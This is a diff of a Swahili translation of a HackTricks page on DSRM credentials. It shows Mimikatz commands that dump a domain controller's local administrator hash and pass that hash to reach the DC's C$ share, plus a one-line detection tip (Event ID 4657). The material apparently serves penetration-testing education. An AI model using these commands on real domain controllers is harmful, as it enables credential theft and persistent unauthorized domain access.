@@ -16,7 +16,7 @@ Learn & practice GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-s
 
 # DSRM Credentials
 
-Kuna akaunti ya **meneja wa ndani** ndani ya kila **DC**. Ukiwa na haki za admin katika mashine hii unaweza kutumia mimikatz **kutoa hash ya Meneja wa ndani**. Kisha, kubadilisha rejista ili **kuamsha nenosiri hili** ili uweze kufikia mtumiaji huyu wa Meneja wa ndani kwa mbali.\
+Kuna akaunti ya **meneja wa ndani** ndani ya kila **DC**. Ukiwa na haki za admin katika mashine hii unaweza kutumia mimikatz **kutoa hash ya Meneja wa ndani**. Kisha, kubadilisha rejista ili **kuanzisha nenosiri hili** ili uweze kufikia mtumiaji huyu wa Meneja wa ndani kwa mbali.\
 Kwanza tunahitaji **kutoa** **hash** ya mtumiaji wa **Meneja wa ndani** ndani ya DC:
 ```bash
 Invoke-Mimikatz -Command '"token::elevate" "lsadump::sam"'
@@ -33,24 +33,24 @@ sekurlsa::pth /domain:dc-host-name /user:Administrator /ntlm:b629ad5753f4c441e3a
 #And in new spawned powershell you now can access via NTLM the content of C$
 ls \\dc-host-name\C$
 ```
-More info about this in: [https://adsecurity.org/?p=1714](https://adsecurity.org/?p=1714) and [https://adsecurity.org/?p=1785](https://adsecurity.org/?p=1785)
+Zaidi ya habari kuhusu hii katika: [https://adsecurity.org/?p=1714](https://adsecurity.org/?p=1714) na [https://adsecurity.org/?p=1785](https://adsecurity.org/?p=1785)
 
-## Mitigation
+## Kupunguza
 
-* Event ID 4657 - Ukaguzi wa uundaji/mabadiliko ya `HKLM:\System\CurrentControlSet\Control\Lsa DsrmAdminLogonBehavior`
+* Kitambulisho cha Tukio 4657 - Ukaguzi wa uundaji/mabadiliko ya `HKLM:\System\CurrentControlSet\Control\Lsa DsrmAdminLogonBehavior`
 
 
 {% hint style="success" %}
-Learn & practice AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
-Learn & practice GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)
+Jifunze na fanya mazoezi ya AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
+Jifunze na fanya mazoezi ya GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)
 
 <details>
 
 <summary>Support HackTricks</summary>
 
-* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
-* **Join the** 💬 [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
-* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.
+* Angalia [**mpango wa usajili**](https://github.com/sponsors/carlospolop)!
+* **Jiunge na** 💬 [**kikundi cha Discord**](https://discord.gg/hRep4RUj7f) au [**kikundi cha telegram**](https://t.me/peass) au **fuata** sisi kwenye **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
+* **Shiriki mbinu za udukuzi kwa kuwasilisha PRs kwa** [**HackTricks**](https://github.com/carlospolop/hacktricks) na [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.
 
 </details>
 {% endhint %}
